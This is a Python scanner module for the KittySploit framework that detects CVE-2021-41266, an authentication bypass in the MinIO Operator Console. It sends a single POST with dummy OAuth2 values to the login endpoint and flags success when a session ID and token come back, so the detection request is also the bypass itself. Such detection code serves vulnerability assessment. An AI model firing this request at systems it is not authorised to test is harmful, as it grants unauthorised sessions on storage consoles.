#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MinIO Console is a graphical user interface for the for MinIO Operator."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MinIO Operator Console Authentication Bypass Detection',
        'description': 'MinIO Console is a graphical user interface for the for MinIO Operator. MinIO itself is a multi-cloud object storage project. Affected versions are subject to an authentication bypass issue in the Operator Console when an external IDP is enabled.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'minio', 'min', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2021-41266',
            'https://github.com/minio/console/security/advisories/GHSA-4999-659w-mq36',
            'https://github.com/minio/console/pull/1217',
            'https://github.com/HimmelAward/Goby_POC',
            'https://github.com/StarCrossPortal/scalpel',
        ],
        'cve': 'CVE-2021-41266',
    }

    def run(self):
        path = '/api/v1/login/oauth2/auth'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Accept': '*/*', 'Content-Type': 'application/json'}, data='{"code":"test","state":"test"}\n')
        if not r or r.status_code not in (201, 200):
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('sessionId',)
        header_any = ('token',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='MinIO Operator Console Authentication Bypass detected', path=path)
            return True
        return False

